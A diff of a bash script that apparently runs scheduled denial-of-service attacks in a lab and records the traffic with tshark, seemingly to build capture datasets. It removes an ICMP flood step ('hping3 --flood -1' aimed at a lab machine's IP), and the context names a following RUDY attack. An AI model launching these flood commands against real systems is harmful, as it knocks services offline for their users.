@@ -62,34 +62,12 @@ echo "Started break 2" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 tshark -i $interface -w "/home/wiresharkTraces/Break2.pcap" -F pcap & pid_tshark=$!
 #Wait for next attack
 sleep $((7*60))
-#Stop the Wireshark capture
-kill "$pid_tshark"
-#Write to file
+
+#Dont participate in attack 3
+sleep $((7*60)) # in seconds
+
+
 echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
-
-#Define variables for attack 3
-attack_type="ping"
-capture_file="/home/wiresharkTraces/ping.pcap"
-traceroute_log="/home/logs/ping_traceroute.log"
-attack_stats_log="/home/logs/ping_stats.log"
-attack_log="/home/logs/ping.log"
-attack_duration=$((7*60)) # in seconds
-destination_ip=$machine13_ip
-destination_port=$machine13_port
-attack_script="hping3 --flood -1 "$destination_ip""
-
-attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
-
-#Write to file
-echo "Started break 3" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
-#Start Wireshark capture
-tshark -i $interface -w "/home/wiresharkTraces/Break3.pcap" -F pcap & pid_tshark=$!
-#Wait for next attack
-sleep $((20*60))
-#Stop the Wireshark capture
-kill "$pid_tshark"
-#Write to file
-echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
 #Define variables for attack 4
 attack_type="RUDY"
